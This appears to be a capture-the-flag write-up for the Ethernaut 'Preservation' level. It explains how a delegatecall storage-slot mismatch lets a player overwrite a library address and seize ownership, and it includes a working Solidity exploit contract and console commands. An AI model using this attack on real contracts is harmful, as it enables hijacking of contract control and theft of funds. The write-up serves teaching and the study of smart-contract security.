# 09. Preservation
<sup>Difficulty 8/10</sup>

This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.

The goal of this level is for you to claim ownership of the instance you are given.

Things that might help

- Look into Solidity's documentation on the `delegatecall` low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.
- Understanding what it means for `delegatecall` to be context-preserving.
- Understanding how storage variables are stored and accessed.
- Understanding how casting works between different data types.

## Solution

We need to take the ownership of the contract. What could we do? 
Preservation contract uses `delegatecall` function to update the `storedTime` variable.

```solidity
contract Preservation {

  // public library contracts 
  address public timeZone1Library; 
  address public timeZone2Library;
  address public owner; 
  uint storedTime;

  [...]

  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  [...]
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;                          

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

The problem between these two contracts resides in the variable declaration order:

**Preservation:**

| Slot | Variable         |
|:-----|:-----------------|
| 0    | timeZone1Library |
| 1    | timeZone2Library |
| 2    | owner            |
| 3    | storedTime       |

**LibraryContract:**

| Slot | Variable         |
|:-----|:-----------------|
| 0    | storedTime       |

Since we're updating the `LibraryContract.storedTime` variable which has slot 0, when we call `setFirstTime` or `setSecondTime` functions using `delegatecall` we'll update also `Preservation` slot 0 variable. Due to the misalignment of the variable declaration between the two contracts, we can update the `timeZone1Library` address.

We can create a contract that implement the `setTime(uint)` function to update the owner:

```solidity 
//SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
contract Exploit {
  address public timeZone1Library; 
  address public timeZone2Library;
  address public owner;
  uint public timeToSet;
  function setTime(uint) public {
    owner = 'OUR ADDRESS'; 
  }
  function getTimeFromAddress(address _addr) public {
    timeToSet = uint(_addr);
  }
}
```

Now, we have to deploy the contract and via the `getTimeFromAddress` function we can retrieve the integer time we have to pass to `setTime` function of the `Preservation` contract.

```javascript
await contract.timeZone1Library()
// -> '0x7Dc17e761933D24F4917EF373F6433d4a62fe3c5'
await contract.setSecondTime('1326533402067413743625077578661884369641532361693')
await contract.timeZone1Library()
// -> '0xe85Bd0a4C4Ae7E2eF7641eeB7550047E4D210Bdd'  // which is our deployed contract
await contract.owner() == player
// -> false
await contract.setFirstTime(123) // We need to perform a call to the first library address which now points to an our controlled contract
await contract.owner() == player
// -> true
```

In depth information here: [Smart Contract Hacking Chapter 7 - Delegate Call Attack Vectors](https://console-cowboys.blogspot.com/2020/10/smart-contract-hacking-chapter-7.html)

## OZ Corner

As the previous level, `delegate` mentions, the use of `delegatecall` to call libraries can be risky. This is particularly true for contract libraries that have their own state. This example demonstrates why the `library` keyword should be used for building libraries, as it prevents the libraries from storing and accessing state variables.